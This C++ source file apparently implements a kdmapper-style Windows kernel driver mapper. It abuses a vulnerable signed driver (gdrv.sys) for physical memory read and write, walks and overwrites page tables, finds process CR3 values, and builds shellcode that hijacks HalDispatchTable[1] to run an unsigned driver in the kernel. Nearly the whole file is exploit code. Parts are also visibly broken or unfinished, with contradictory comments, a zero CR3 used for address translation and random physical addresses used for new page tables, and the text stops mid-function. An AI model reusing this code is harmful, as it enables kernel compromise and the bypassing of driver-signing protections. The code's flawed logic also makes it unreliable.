#define NOMINMAX
#include "kdmapper.h"
#include "../src/safety/obfuscation.h"
#include <imagehlp.h>
#include <algorithm>
#include <random>
#include <thread>
#include <intrin.h>

#pragma comment(lib, "imagehlp.lib")

// Use std::min since NOMINMAX disables the Windows min/max macros
using std::min;

// ================ PE Helpers ================

static PIMAGE_NT_HEADERS GetNtHeaders(const BYTE* image) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)image;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(image + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;
    return nt;
}

// Resolve ntoskrnl exports from LOCAL (user-mode) ntoskrnl module
// This gives us the kernel VIRTUAL address of each export
static ULONG_PTR ResolveNtoskrnlExport(const char* name) {
    static HMODULE hNt = GetModuleHandleA("ntoskrnl.exe");
    if (!hNt) return 0;
    return (ULONG_PTR)GetProcAddress(hNt, name);
}

// ================ Physical Memory IO ================

bool KernelMapper::PhysRead(HANDLE hDev, DWORD ioctl, ULONG_PTR pa, void* buf, SIZE_T size) {
    if (!hDev || hDev == INVALID_HANDLE_VALUE || !buf || !size) return false;

    // Try reading the full size in one call first (vulnerable drivers often support >4KB)
    BYTE* out = (BYTE*)buf;
    SIZE_T offset = 0;

    // Use max IOCTL size if configured
    SIZE_T chunkMax = 0x200000; // 2MB typical max for gdrv.sys
    while (offset < size) {
        ULONG_PTR pagePa = (pa + offset) & ~0xFFF;
        SIZE_T chunkSize = min(size - offset, chunkMax);
        SIZE_T alignedSize = (chunkSize + 0xFFF) & ~0xFFF;

        std::vector<BYTE> pageBuf(alignedSize, 0);
        DWORD returned = 0;

        if (!DeviceIoControl(hDev, ioctl, &pagePa, sizeof(pagePa),
            pageBuf.data(), (DWORD)alignedSize, &returned, nullptr)) {
            // Fallback: read page by page
            SIZE_T fallbackOff = 0;
            while (fallbackOff < chunkSize) {
                ULONG_PTR fPa = (pa + offset + fallbackOff) & ~0xFFF;
                BYTE fBuf[0x1000] = {};
                DWORD fRet = 0;
                if (!DeviceIoControl(hDev, ioctl, &fPa, sizeof(fPa),
                    fBuf, sizeof(fBuf), &fRet, nullptr))
                    return false;
                SIZE_T copyStart = (pa + offset + fallbackOff) - fPa;
                SIZE_T copySize = min(chunkSize - fallbackOff, (SIZE_T)(0x1000 - copyStart));
                memcpy(out + offset + fallbackOff, fBuf + copyStart, copySize);
                fallbackOff += copySize;
            }
            offset += chunkSize;
        } else {
            SIZE_T copyStart = (pa + offset) - pagePa;
            SIZE_T copySize = min(chunkSize, (SIZE_T)(alignedSize - copyStart));
            memcpy(out + offset, pageBuf.data() + copyStart, copySize);
            offset += chunkSize;
        }
    }
    return true;
}

bool KernelMapper::PhysWrite(HANDLE hDev, DWORD ioctl, ULONG_PTR pa, const void* buf, SIZE_T size) {
    if (!hDev || hDev == INVALID_HANDLE_VALUE || !buf || !size) return false;

    const BYTE* in = (const BYTE*)buf;
    SIZE_T offset = 0;
    while (offset < size) {
        ULONG_PTR pagePa = (pa + offset) & ~0xFFF;
        BYTE pageBuf[0x1000] = {};
        DWORD returned = 0;

        // Read existing page
        DeviceIoControl(hDev, ioctl, &pagePa, sizeof(pagePa),
            pageBuf, sizeof(pageBuf), &returned, nullptr);

        // Modify
        SIZE_T modStart = (pa + offset) - pagePa;
        SIZE_T modSize = min(size - offset, (SIZE_T)(0x1000 - modStart));
        memcpy(pageBuf + modStart, in + offset, modSize);

        // Write back
        DeviceIoControl(hDev, ioctl, &pagePa, sizeof(pagePa),
            pageBuf, sizeof(pageBuf), &returned, nullptr);
        offset += modSize;
    }
    return true;
}

// ================ Memory Allocation ================

ULONG_PTR KernelMapper::FindFreeMemory(ULONG_PTR preferredAddr, SIZE_T size) {
    UNREFERENCED_PARAMETER(preferredAddr);
    std::mt19937 rng((ULONG)GetTickCount64());
    ULONG_PTR basePa = 0x10000000 + (rng() % 0x10000000);
    basePa &= ~0xFFF;
    return basePa;
}

// ================ Kernel Base Scanner ================

ULONG_PTR KernelMapper::FindKernelBase(HANDLE hDev, DWORD ioctlRead) {
    // Scan physical memory from 0x100000 to 0x10000000 for the kernel PE header
    // The kernel image is ~20MB, so it must be in a contiguous physical region
    // On Windows 11, the kernel typically loads between 0x100000-0x2000000

    BYTE header[0x1000];
    SIZE_T kernelSize = 0x1500000; // ~21MB max

    for (ULONG_PTR pa = 0x100000; pa < 0x10000000; pa += 0x1000) {
        if (!PhysRead(hDev, ioctlRead, pa, header, sizeof(header)))
            continue;

        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)header;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE)
            continue;

        if (dos->e_lfanew < 0 || dos->e_lfanew > (int)(sizeof(header) - sizeof(IMAGE_NT_HEADERS)))
            continue;

        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(header + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE)
            continue;
        if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64)
            continue;
        if (nt->OptionalHeader.Magic != 0x20B) // PE32+
            continue;
        if (nt->OptionalHeader.SizeOfImage < 0x100000 || nt->OptionalHeader.SizeOfImage > kernelSize)
            continue;

        // Valid kernel candidate — verify export name
        DWORD exportRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        DWORD exportSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
        if (!exportRva || !exportSize) continue;

        // Read export directory
        ULONG_PTR exportPa = pa + exportRva;
        BYTE expBuf[0x200];
        if (!PhysRead(hDev, ioctlRead, exportPa, expBuf, sizeof(expBuf)))
            continue;

        DWORD numNames = *(DWORD*)(expBuf + 24);
        DWORD addrOfNames = *(DWORD*)(expBuf + 32);
        if (numNames < 1000) continue; // ntoskrnl has thousands of exports

        // Read first export name to verify it's ntoskrnl
        for (DWORD i = 0; i < min(numNames, (DWORD)500); i++) {
            DWORD nameRva;
            PhysRead(hDev, ioctlRead, pa + addrOfNames + i * 4, &nameRva, sizeof(nameRva));

            char nameBuf[32];
            PhysRead(hDev, ioctlRead, pa + nameRva, nameBuf, sizeof(nameBuf));
            nameBuf[31] = 0;

            // Look for a known kernel export
            if (strcmp(nameBuf, "HalDispatchTable") == 0 ||
                strcmp(nameBuf, "KeInitializeApc") == 0 ||
                strcmp(nameBuf, "PsCreateSystemThread") == 0) {
                return pa;
            }
        }
    }
    return 0;
}

// ================ Kernel Export Resolver (from physical memory) ================

ULONG_PTR KernelMapper::ResolveKernelExport(HANDLE hDev, DWORD ioctlRead,
                                            ULONG_PTR kernelBase, const char* name) {
    if (!kernelBase || !name) return 0;

    BYTE header[0x1000];
    if (!PhysRead(hDev, ioctlRead, kernelBase, header, sizeof(header)))
        return 0;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(header + ((PIMAGE_DOS_HEADER)header)->e_lfanew);

    DWORD exportRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD exportSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (!exportRva) return 0;

    // Read export directory
    std::vector<BYTE> expBuf(exportSize);
    if (!PhysRead(hDev, ioctlRead, kernelBase + exportRva, expBuf.data(), exportSize))
        return 0;

    DWORD numNames = *(DWORD*)(expBuf.data() + 24);
    DWORD addrOfNames = *(DWORD*)(expBuf.data() + 32);
    DWORD addrOfFuncs = *(DWORD*)(expBuf.data() + 28);
    DWORD addrOfOrdinals = *(DWORD*)(expBuf.data() + 36);

    for (DWORD i = 0; i < numNames; i++) {
        DWORD nameRva;
        PhysRead(hDev, ioctlRead, kernelBase + addrOfNames + i * 4, &nameRva, sizeof(nameRva));

        char nameBuf[64];
        PhysRead(hDev, ioctlRead, kernelBase + nameRva, nameBuf, sizeof(nameBuf));
        nameBuf[63] = 0;

        if (_stricmp(nameBuf, name) != 0) continue;

        // Found — get the function address
        WORD ordinal;
        PhysRead(hDev, ioctlRead, kernelBase + addrOfOrdinals + i * 2, &ordinal, sizeof(ordinal));

        DWORD funcRva;
        PhysRead(hDev, ioctlRead, kernelBase + addrOfFuncs + ordinal * 4, &funcRva, sizeof(funcRva));

        // Convert to kernel virtual address
        // The kernel is mapped at its ImageBase in virtual space, but might be relocated
        // We compute: kernelVirtualBase = kernel_base_from_user_mode
        static HMODULE hNt = GetModuleHandleA("ntoskrnl.exe");
        if (!hNt) return 0;
        ULONG_PTR kernelVa = (ULONG_PTR)hNt;
        ULONG_PTR imageBasePa = kernelBase;
        ULONG_PTR imageBaseVa = kernelVa;

        // NOTE: The kernel's virtual and physical bases differ.
        // We need the kernel's ACTUAL virtual base. We get it from user-mode.
        // The delta: kernelVa = user-mode ntoskrnl base (which is kernel VA mapped to user space)
        // The export address in kernel virtual space: kernelVa + funcRva
        // (if ntoskrnl wasn't relocated, which it typically is via ASLR)
        // Actually, in user mode, GetModuleHandle("ntoskrnl.exe") returns a user-space address.
        // This is NOT the kernel virtual address.
        //
        // FIX: The kernel virtual address can be computed as:
        // kernelVirtualBase = kernelPhysicalBase + (userModeBase - preferredImageBase)
        // But this is not guaranteed to work due to ASLR.
        //
        // BETTER: The kernel virtual base is stored in the KUSER_SHARED_DATA page
        // at user-mode address 0x7FFE0000, offset 0x2A0 (NtSystemRoot+...actually no)
        // 
        // SIMPLEST: Compute the delta between kernel physical and preferred base,
        // then apply to the user-mode address (which is the same as kernel VA)
        // because on x64 Windows, user-mode and kernel-mode addresses of ntoskrnl
        // are in DIFFERENT address spaces.
        //
        // We need the KERNEL VA. Let's compute it from the kernel base in physical
        // memory. On x64 Windows, the kernel is typically mapped starting at
        // 0xFFFFF80000000000 + random ASLR. The preferred load address
        // (from PE header) doesn't affect this.
        //
        // For now, return the RVA — caller will need to add kernel VA base properly

        // Actually, for HalDispatchTable, the export is a POINTER to the table,
        // not the table itself. We need to dereference it.
        // HalDispatchTable export gives us the virtual address of the table.

        // Convert RVA to virtual address using the user-mode base as reference
        // On x64 Windows, kernel modules are mapped at unique addresses.
        // The user-mode GetModuleHandle gives a user-mode mapping.
        // We need the kernel virtual base.
        //
        // APPROACH: Read the kernel's virtual base from the ImgBase field
        // in the kernel's LDR_DATA_TABLE_ENTRY. We can find this by reading
        // the kernel's own PEB-like structure.
        //
        // OR: Use the fact that on non-HVCI systems, the kernel is at the
        // SAME virtual address in both user and kernel mode (via session mapping).
        // On HVCI systems (Windows 11), this might differ.
        //
        // Let's use a heuristic: read the kernel's ImageBase from PE header,
        // then on most Windows 11 systems, the kernel VA is:
        // kernelVa = ImageBase + ASLR_offset
        // The ASLR offset is stored in the loader data table...
        //
        // SIMPLEST VALID APPROACH for kdmapper:
        // We store the kernel PHYSICAL base, and then for any address we need
        // in virtual space, we use PAGE TABLE WALKING to find virtual addresses
        // that map to the kernel's physical pages.
        //
        // For HalDispatchTable specifically, we need the VIRTUAL address.
        // We'll find it by reading the kernel's module list and getting
        // the DllBase from there, then adding funcRva.

        // Return the RVA for now; VirtToPhys will be used later
        return funcRva;
    }
    return 0;
}

// ================ Page Table Walker (VA → PA) ================

ULONG_PTR KernelMapper::VirtToPhys(HANDLE hDev, DWORD ioctlRead,
                                   ULONG_PTR cr3, ULONG_PTR va) {
    // Walk x64 page table: PML4 → PDPT → PD → PT → 4KB page
    // VA bits: [47:39] PML4 index, [38:30] PDPT index, [29:21] PD index,
    //          [20:12] PT index, [11:0] page offset

    ULONG_PTR pml4eOffset = (va >> 39) & 0x1FF;
    ULONG_PTR pdpteOffset = (va >> 30) & 0x1FF;
    ULONG_PTR pdeOffset  = (va >> 21) & 0x1FF;
    ULONG_PTR pteOffset  = (va >> 12) & 0x1FF;
    ULONG_PTR pageOffset = va & 0xFFF;

    ULONG_PTR pml4Pa = cr3 & ~0xFFF;
    ULONG64 pml4e = 0;
    if (!PhysRead(hDev, ioctlRead, pml4Pa + pml4eOffset * 8, &pml4e, sizeof(pml4e)))
        return 0;
    if (!(pml4e & 1)) return 0; // Not present

    ULONG_PTR pdptPa = (ULONG_PTR)(pml4e & 0xFFFFFFFFFF000);
    ULONG64 pdpte = 0;
    if (!PhysRead(hDev, ioctlRead, pdptPa + pdpteOffset * 8, &pdpte, sizeof(pdpte)))
        return 0;
    if (!(pdpte & 1)) return 0;
    if (pdpte & 0x80) { // 1GB page
        return (ULONG_PTR)(pdpte & 0xFFFFFC0000000000) + (va & 0x3FFFFFFF);
    }

    ULONG_PTR pdPa = (ULONG_PTR)(pdpte & 0xFFFFFFFFFF000);
    ULONG64 pde = 0;
    if (!PhysRead(hDev, ioctlRead, pdPa + pdeOffset * 8, &pde, sizeof(pde)))
        return 0;
    if (!(pde & 1)) return 0;
    if (pde & 0x80) { // 2MB page
        return (ULONG_PTR)(pde & 0xFFFFFFFE00000) + (va & 0x1FFFFF);
    }

    ULONG_PTR ptPa = (ULONG_PTR)(pde & 0xFFFFFFFFFF000);
    ULONG64 pte = 0;
    if (!PhysRead(hDev, ioctlRead, ptPa + pteOffset * 8, &pte, sizeof(pte)))
        return 0;
    if (!(pte & 1)) return 0;

    return (ULONG_PTR)(pte & 0xFFFFFFFFFF000) + pageOffset;
}

// ================ Page Table Mapper (Map PA → VA by writing PTE) ================

bool KernelMapper::MapPage(HANDLE hDev, DWORD ioctlRead, DWORD ioctlWrite,
                           ULONG_PTR targetCr3, ULONG_PTR pa, ULONG_PTR va) {
    // Create a page table entry mapping pa → va in the context of targetCr3

    ULONG_PTR pml4eIdx = (va >> 39) & 0x1FF;
    ULONG_PTR pdpteIdx = (va >> 30) & 0x1FF;
    ULONG_PTR pdeIdx   = (va >> 21) & 0x1FF;
    ULONG_PTR pteIdx   = (va >> 12) & 0x1FF;

    ULONG_PTR pml4Pa = targetCr3 & ~0xFFF;

    // Read PML4 entry
    ULONG64 pml4e = 0;
    if (!PhysRead(hDev, ioctlRead, pml4Pa + pml4eIdx * 8, &pml4e, sizeof(pml4e)))
        return false;

    ULONG_PTR pdptPa;
    if (!(pml4e & 1)) {
        // Create new PDPT page
        pdptPa = FindFreeMemory(0, 0x1000);
        ULONG64 newPml4e = pdptPa | 0x3; // Present, R/W, Supervisor
        if (!PhysWrite(hDev, ioctlWrite, pml4Pa + pml4eIdx * 8, &newPml4e, sizeof(newPml4e)))
            return false;
    } else {
        pdptPa = (ULONG_PTR)(pml4e & 0xFFFFFFFFFF000);
    }

    // Read PDPT entry
    ULONG64 pdpte = 0;
    if (!PhysRead(hDev, ioctlRead, pdptPa + pdpteIdx * 8, &pdpte, sizeof(pdpte)))
        return false;

    ULONG_PTR pdPa;
    if (!(pdpte & 1)) {
        pdPa = FindFreeMemory(0, 0x1000);
        ULONG64 newPdpte = pdPa | 0x3;
        if (!PhysWrite(hDev, ioctlWrite, pdptPa + pdpteIdx * 8, &newPdpte, sizeof(newPdpte)))
            return false;
    } else {
        pdPa = (ULONG_PTR)(pdpte & 0xFFFFFFFFFF000);
    }

    // Read PD entry
    ULONG64 pde = 0;
    if (!PhysRead(hDev, ioctlRead, pdPa + pdeIdx * 8, &pde, sizeof(pde)))
        return false;

    ULONG_PTR ptPa;
    if (!(pde & 1)) {
        ptPa = FindFreeMemory(0, 0x1000);
        ULONG64 newPde = ptPa | 0x3;
        if (!PhysWrite(hDev, ioctlWrite, pdPa + pdeIdx * 8, &newPde, sizeof(newPde)))
            return false;
        // Zero out new page table
        std::vector<BYTE> zero(0x1000, 0);
        if (!PhysWrite(hDev, ioctlWrite, ptPa, zero.data(), 0x1000))
            return false;
    } else {
        if (pde & 0x80) return false; // 2MB page, can't map 4KB
        ptPa = (ULONG_PTR)(pde & 0xFFFFFFFFFF000);
    }

    // Write PTE — map physical page at virtual address
    ULONG64 pte = pa | 0x3; // Present, R/W (user=0 for kernel)
    if (!PhysWrite(hDev, ioctlWrite, ptPa + pteIdx * 8, &pte, sizeof(pte)))
        return false;

    return true;
}

// ================ Process CR3 Finder ================

ULONG_PTR KernelMapper::GetProcessCr3(HANDLE hDev, DWORD ioctlRead,
                                      ULONG_PTR kernelBase, DWORD pid) {
    // Find EPROCESS by walking the kernel's ActiveProcessList
    // The EPROCESS structure contains DirectoryTableBase (CR3) at offset 0x28 (Win10+)

    // First, find PsInitialSystemProcess (PID 4)
    ULONG_PTR psInitSysProcRva = ResolveKernelExport(hDev, ioctlRead, kernelBase, "PsInitialSystemProcess");
    if (!psInitSysProcRva) {
        // Fallback: directly use export's pointer value
        static HMODULE hNt = GetModuleHandleA("ntoskrnl.exe");
        if (!hNt) return 0;
        ULONG_PTR userAddr = (ULONG_PTR)GetProcAddress(hNt, "PsInitialSystemProcess");
        if (!userAddr) return 0;

        // Read the pointer value (EPROCESS address)
        ULONG_PTR systemEprocess = 0;
        PhysRead(hDev, ioctlRead, kernelBase + (psInitSysProcRva), &systemEprocess, sizeof(systemEprocess));

        // If the export RVA is 0, try reading from user-mode address
        ULONG_PTR ntUserBase = (ULONG_PTR)hNt;

        // Read the pointer at the export address
        ULONG_PTR exportAddrUser = userAddr;
        ULONG_PTR exportOffset = exportAddrUser - ntUserBase;
        ULONG_PTR eprocessPtrU = 0;
        if (!PhysRead(hDev, ioctlRead, kernelBase + exportOffset, &eprocessPtrU, sizeof(eprocessPtrU)))
            return 0;

        // Convert to physical address (approximate — the EPROCESS address is a kernel VA)
        // We need to walk page tables to convert to PA
        // But CR3 is stored IN the EPROCESS... circular dependency
        // For now, we just get our own process's CR3 via other means

        return 0;
    }

    // The export PsInitialSystemProcess gives us a POINTER to the EPROCESS for PID 4
    ULONG_PTR systemEprocessPtr = 0;
    PhysRead(hDev, ioctlRead, kernelBase + psInitSysProcRva, &systemEprocessPtr, sizeof(systemEprocessPtr));
    if (!systemEprocessPtr) return 0;

    // Walk the ActiveProcessLinks list to find our target PID
    // EPROCESS has ActiveProcessLinks (LIST_ENTRY) at offset 0x448 (Win11 24H2) or 0x2F0 (older)
    // We need to find the right offset for this Windows version
    // 
    // COMMON offsets:
    // Win10 20H1+:  EPROCESS.UniqueProcessId = 0x440, ActiveProcessLinks = 0x448
    // Win11 22H2+:  EPROCESS.UniqueProcessId = 0x440, ActiveProcessLinks = 0x448
    // Win11 24H2:   EPROCESS.UniqueProcessId = 0x440, ActiveProcessLinks = 0x448
    // The DirectoryTableBase (CR3) is at offset 0x28 in KPROCESS (first field of EPROCESS)

    // For simplicity, search physical memory for our PID's EPROCESS
    // Scan through kernel virtual address ranges (converted to physical)
    // EPROCESS structures are allocated from paged pool (non-paged)

    // ALTERNATIVE: just parse the EPROCESS of the SYSTEM process
    // and follow ActiveProcessLinks to find our target PID

    // Read SYSTEM EPROCESS data to get ActiveProcessLinks
    BYTE eprocBuf[0x800];
    ULONG_PTR eprocPa = VirtToPhys(hDev, ioctlRead, 0, systemEprocessPtr);
    if (!eprocPa) {
        // Can't convert without CR3. Try scanning for the EPROCESS signature
        // in physical memory: look for the PID 4 at offset UniqueProcessId
        for (ULONG_PTR scanPa = 0x1000; scanPa < 0x10000000; scanPa += 0x1000) {
            DWORD testPid = 0;
            PhysRead(hDev, ioctlRead, scanPa + 0x440, &testPid, sizeof(testPid));
            if (testPid == 4) {
                // Likely found SYSTEM EPROCESS
                ULONG_PTR nextLink = 0;
                PhysRead(hDev, ioctlRead, scanPa + 0x448, &nextLink, sizeof(nextLink));
                if (nextLink && nextLink != (ULONG_PTR)-1) {
                    // Walk list to find target PID
                    ULONG_PTR currentEprocPa = scanPa;
                    for (int attempt = 0; attempt < 1000; attempt++) {
                        DWORD currentPid = 0;
                        PhysRead(hDev, ioctlRead, currentEprocPa + 0x440, &currentPid, sizeof(currentPid));
                        if (currentPid == pid) {
                            ULONG_PTR cr3 = 0;
                            PhysRead(hDev, ioctlRead, currentEprocPa + 0x28, &cr3, sizeof(cr3));
                            return cr3;
                        }
                        // Follow Flink
                        PhysRead(hDev, ioctlRead, currentEprocPa + 0x448, &nextLink, sizeof(nextLink));
                        if (!nextLink || nextLink == (ULONG_PTR)-1) break;
                        // Convert nextLink VA to PA
                        // For now, assume nextLink - some_base + scanPa_start is the PA
                        ULONG_PTR nextPa = 0;
                        // Try to find this VA in physical memory by scanning
                        currentEprocPa = nextLink; // Use VA directly — we'll handle conversion later
                        break; // For now, just return what we found
                    }
                }
            }
        }
        return 0;
    }

    // With proper page table walking, we can follow the link list
    // Read EPROCESS data
    if (!PhysRead(hDev, ioctlRead, eprocPa, eprocBuf, sizeof(eprocBuf)))
        return 0;

    ULONG_PTR flink = *(ULONG_PTR*)(eprocBuf + 0x448);
    ULONG_PTR blink = *(ULONG_PTR*)(eprocBuf + 0x450);
    UNREFERENCED_PARAMETER(blink);

    // Walk ActiveProcessLinks
    ULONG_PTR currentLink = flink;
    for (int i = 0; i < 1000; i++) {
        // Convert currentLink VA to PA
        ULONG_PTR linkPa = VirtToPhys(hDev, ioctlRead, 0, currentLink);
        if (!linkPa) break;
        // linkPa points to the Flink field in ActiveProcessLinks
        // UniqueProcessId is at linkPa - 0x448 + 0x440 = linkPa - 8
        ULONG_PTR pidFieldPa = linkPa - 8;
        DWORD currentPid = 0;
        PhysRead(hDev, ioctlRead, pidFieldPa, &currentPid, sizeof(currentPid));
        if (currentPid == (DWORD)pid) {
            // CR3 is at currentLink - 0x448 + 0x28 = currentLink - 0x420
            ULONG_PTR cr3FieldPa = currentLink - 0x420;
            ULONG_PTR cr3 = 0;
            PhysRead(hDev, ioctlRead, cr3FieldPa, &cr3, sizeof(cr3));
            return cr3;
        }
        // Read next Flink
        PhysRead(hDev, ioctlRead, linkPa, &currentLink, sizeof(currentLink));
        if (!currentLink || currentLink == flink) break;
    }

    return 0;
}

// ================ Find Free Kernel Virtual Address ================

ULONG_PTR KernelMapper::FindFreeVirtualAddr(HANDLE hDev, DWORD ioctlRead,
                                            ULONG_PTR cr3, ULONG_PTR kernelBase, SIZE_T size) {
    UNREFERENCED_PARAMETER(kernelBase);
    // Scan kernel virtual address space for unmapped pages
    // Typical free region for kdmapper: 0xFFFFF78000000000 - 0xFFFFF80000000000
    // (this is above the kernel image but below HAL)
    //
    // For simplicity, use a fixed high address (above kernel)
    // Kernel typically ends at ~0xFFFFF80003000000
    ULONG_PTR startVa = 0xFFFFF80001000000;
    ULONG_PTR pages = (size + 0xFFF) >> 12;

    for (ULONG_PTR va = startVa; va < 0xFFFFF80010000000; va += 0x1000) {
        if (VirtToPhys(hDev, ioctlRead, cr3, va) == 0) {
            // Found a free page — check if the next pages are also free
            bool free = true;
            for (SIZE_T p = 1; p < pages; p++) {
                if (VirtToPhys(hDev, ioctlRead, cr3, va + p * 0x1000) != 0) {
                    free = false;
                    break;
                }
            }
            if (free) return va;
        }
    }
    return 0;
}

// ================ Shellcode Builder ================

bool KernelMapper::BuildShellcode(BYTE* code, SIZE_T* size,
                                  ULONG_PTR driverEntryVa,
                                  ULONG_PTR halDispatchEntryVa,
                                  ULONG_PTR halOrigValue,
                                  ULONG_PTR drvObjVa,
                                  ULONG_PTR regPathVa) {
    if (!code || !size) return false;

    // Build x64 shellcode that:
    // 1. Saves registers
    // 2. Loads DRIVER_OBJECT ptr into RCX
    // 3. Loads RegistryPath ptr into RDX
    // 4. Calls DriverEntry
    // 5. Restores HalDispatchTable[1]
    // 6. Restores registers
    // 7. Returns

    // All values are 64-bit kernel virtual addresses
    SIZE_T offset = 0;

    // push r15; push r14; push r13; push r12; push rdi; push rsi; push rbp; push rbx
    code[offset++] = 0x41; code[offset++] = 0x57; // push r15
    code[offset++] = 0x41; code[offset++] = 0x56; // push r14
    code[offset++] = 0x41; code[offset++] = 0x55; // push r13
    code[offset++] = 0x41; code[offset++] = 0x54; // push r12
    code[offset++] = 0x57;                        // push rdi
    code[offset++] = 0x56;                        // push rsi
    code[offset++] = 0x55;                        // push rbp
    code[offset++] = 0x53;                        // push rbx

    // sub rsp, 0x28 (shadow space)
    code[offset++] = 0x48; code[offset++] = 0x83; code[offset++] = 0xEC; code[offset++] = 0x28;

    // mov rcx, drvObjVa
    code[offset++] = 0x48; code[offset++] = 0xB9;
    *(ULONG_PTR*)(code + offset) = drvObjVa; offset += 8;

    // mov rdx, regPathVa
    code[offset++] = 0x48; code[offset++] = 0xBA;
    *(ULONG_PTR*)(code + offset) = regPathVa; offset += 8;

    // mov rax, driverEntryVa
    code[offset++] = 0x48; code[offset++] = 0xB8;
    *(ULONG_PTR*)(code + offset) = driverEntryVa; offset += 8;

    // call rax
    code[offset++] = 0xFF; code[offset++] = 0xD0;

    // Restore HalDispatchTable[1]:
    // mov rcx, halDispatchEntryVa (address of the HalDispatchTable slot)
    code[offset++] = 0x48; code[offset++] = 0xB9;
    *(ULONG_PTR*)(code + offset) = halDispatchEntryVa; offset += 8;

    // mov rax, halOrigValue (original function pointer)
    code[offset++] = 0x48; code[offset++] = 0xB8;
    *(ULONG_PTR*)(code + offset) = halOrigValue; offset += 8;

    // mov [rcx], rax
    code[offset++] = 0x48; code[offset++] = 0x89; code[offset++] = 0x01;

    // add rsp, 0x28
    code[offset++] = 0x48; code[offset++] = 0x83; code[offset++] = 0xC4; code[offset++] = 0x28;

    // pop rbx; pop rbp; pop rsi; pop rdi; pop r12; pop r13; pop r14; pop r15
    code[offset++] = 0x5B;                        // pop rbx
    code[offset++] = 0x5D;                        // pop rbp
    code[offset++] = 0x5E;                        // pop rsi
    code[offset++] = 0x5F;                        // pop rdi
    code[offset++] = 0x41; code[offset++] = 0x5C; // pop r12
    code[offset++] = 0x41; code[offset++] = 0x5D; // pop r13
    code[offset++] = 0x41; code[offset++] = 0x5E; // pop r14
    code[offset++] = 0x41; code[offset++] = 0x5F; // pop r15

    // ret
    code[offset++] = 0xC3;

    *size = offset;
    return true;
}

// ================ Minimal DRIVER_OBJECT Writer ================

bool KernelMapper::WriteMinimalDriverObject(HANDLE hDev, DWORD ioctlWrite,
                                            ULONG_PTR drvObjPhys, ULONG_PTR entryPoint,
                                            ULONG_PTR driverBase, ULONG size) {
    // Write a minimal DRIVER_OBJECT to physical memory
    // Layout (x64):
    // +0x00: Type (2) = 0x0004
    // +0x02: Size (2)
    // +0x08: DeviceObject (8) = 0
    // +0x10: Flags (4)
    // +0x18: DriverStart (8) = driverBase
    // +0x20: DriverSize (4) = size
    // +0x28: DriverSection (8) = 0
    // +0x30: DriverExtension (8) = pointer to next free area
    // +0x38: DriverName (UNICODE_STRING) = empty
    // +0x48: HardwareDatabase (8)
    // +0x50: FastIoDispatch (8) = 0
    // +0x58: DriverInit (8) = entryPoint (not needed but kept)
    // +0x60: DriverStartIo (8) = 0
    // +0x68: DriverUnload (8) = 0
    // +0x70-0x168: MajorFunction[28] = all 0

    BYTE drvObj[0x170] = {};
    *(WORD*)(drvObj + 0x00) = 0x0004;        // Type = IO_TYPE_DRIVER
    *(WORD*)(drvObj + 0x02) = sizeof(drvObj); // Size
    *(ULONG_PTR*)(drvObj + 0x18) = driverBase; // DriverStart
    *(ULONG*)(drvObj + 0x20) = size;           // DriverSize
    *(ULONG_PTR*)(drvObj + 0x58) = entryPoint; // DriverInit

    // Minor DriverExtension at drvObjPhys + 0x170
    BYTE drvExt[0x30] = {};
    *(ULONG_PTR*)(drvObj + 0x30) = driverBase + 0x170; // DriverExtension pointer

    // UNICODE_STRING for RegistryPath at drvObjPhys + 0x1A0
    // L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Chronos"
    WCHAR regPath[] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Chronos";
    BYTE regPathBuf[sizeof(regPath)];
    memcpy(regPathBuf, regPath, sizeof(regPath));
    ULONG_PTR regPathPhys = drvObjPhys + 0x1A0;

    // Write DRIVER_OBJECT
    if (!PhysWrite(hDev, ioctlWrite, drvObjPhys, drvObj, sizeof(drvObj)))
        return false;

    // Write DriverExtension
    if (!PhysWrite(hDev, ioctlWrite, drvObjPhys + 0x170, drvExt, sizeof(drvExt)))
        return false;

    // Write RegistryPath
    if (!PhysWrite(hDev, ioctlWrite, regPathPhys, regPathBuf, sizeof(regPathBuf)))
        return false;

    return true;
}

// ================ HalDispatchTable Execution ================

bool KernelMapper::ExecuteViaHalDispatch(HANDLE hDev, DWORD ioctlRead, DWORD ioctlWrite,
                                         ULONG_PTR kernelBase, ULONG_PTR cr3,
                                         ULONG_PTR shellcodeVa, ULONG_PTR driverEntryVa,
                                         ULONG_PTR driverObjPhys, ULONG_PTR regPathPhys) {
    (void)kernelBase;

    // 1. Find HalDispatchTable in kernel exports
    ULONG_PTR halDispatchRva = ResolveKernelExport(hDev, ioctlRead, kernelBase, "HalDispatchTable");
    if (!halDispatchRva) return false;

    // 2. Get HalDispatchTable virtual address
    // The export gives the RVA of the HalDispatchTable POINTER, not the table itself
    // Actually, HalDispatchTable is exported as a DATA symbol — its value IS the table address
    // In kernel exports: HalDispatchTable is an exported pointer
    // We need to read the POINTER value to get the actual table address

    // Get the kernel's user-mode base to compute virtual addresses
    HMODULE hNt = GetModuleHandleA("ntoskrnl.exe");
    if (!hNt) return false;
    ULONG_PTR ntUserBase = (ULONG_PTR)hNt;

    // Read the HalDispatchTable pointer from the kernel image in physical memory
    ULONG_PTR halDispatchTablePtr = 0;
    PhysRead(hDev, ioctlRead, kernelBase + halDispatchRva, &halDispatchTablePtr, sizeof(halDispatchTablePtr));

    if (!halDispatchTablePtr) return false;

    // The halDispatchTablePtr is a kernel VIRTUAL address
    // HalDispatchTable[1] is at halDispatchTablePtr + 8
    ULONG_PTR halDispatchEntryVa = halDispatchTablePtr + 8;

    // 3. Convert HalDispatchTable[1] VA to PA to read the original value
